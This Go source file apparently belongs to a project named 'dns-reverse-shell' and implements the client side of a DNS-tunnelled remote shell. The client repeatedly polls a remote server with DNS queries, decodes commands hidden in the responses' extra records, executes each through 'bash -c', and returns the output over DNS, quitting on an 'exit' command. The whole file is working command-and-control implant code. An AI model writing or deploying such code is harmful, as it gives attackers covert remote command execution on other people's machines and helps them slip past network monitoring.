package protocol

import (
	"dns-reverse-shell/main/encoder"
	"fmt"
	"github.com/miekg/dns"
	"os"
	"os/exec"
	"time"
)

const sleepIdleTime = 60
const interactiveIdleTime = 5

type messageType string

const (
	POLL   messageType = "poll"
	ANSWER messageType = "answer"
	EXIT   messageType = "exit"
)

type DNSClient struct {
	address         string
	encoder         encoder.StringEncoder
	messageSplitter MessageSplitter
	client          *dns.Client
	idleCounter     int
}

func NewDNSClient(address string, encoder encoder.StringEncoder) *DNSClient {
	client := new(dns.Client)
	client.Net = "tcp"
	return &DNSClient{address: address, encoder: encoder, messageSplitter: NewSimpleMessageSplitter(), client: client}
}

func (d DNSClient) Start() {
	for {
		d.poll()
		if d.idleCounter >= 12 {
			time.Sleep(sleepIdleTime * time.Second)
		} else {
			time.Sleep(interactiveIdleTime * time.Second)
		}
	}
}

func (d DNSClient) poll() {
	d.sendMessage(POLL, "poll")
}

func (d DNSClient) sendMessage(commandType messageType, message string) {
	m := d.createMessage(commandType, message)
	in, _, err := d.client.Exchange(m, d.address)
	if err != nil {
		fmt.Println(err)
	} else {
		d.handleAnswer(in)
	}
}

func (d DNSClient) createMessage(commandType messageType, message string) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(string(commandType)), dns.TypeA)
	m.Extra = d.messageSplitter.Split(d.encoder.Encode(message))
	return m
}

func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
	//answer to ifconfig seems to be too big to be sent in 1 msg
	//todo: handle big answers
	collect := d.messageSplitter.Collect(answerMsg.Extra)
	if collect == "" {
		return
	}
	decoded := d.encoder.Decode(collect)
	fmt.Println(decoded)
	d.handleDecodedCommand(decoded)
}

func (d DNSClient) handleDecodedCommand(decoded string) {
	switch decoded {
	case "idle":
		d.idleCounter++
		break
	case "ok":
		d.idleCounter = 0
		break
	case "exit":
		d.sendMessage(EXIT, "exit")
		os.Exit(0)
	default:
		d.idleCounter = 0
		output := executeCommand(decoded)
		d.sendMessage(ANSWER, output)
	}
}

func executeCommand(command string) string {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return "command execution failed: " + err.Error()
	}
	return string(output)
}
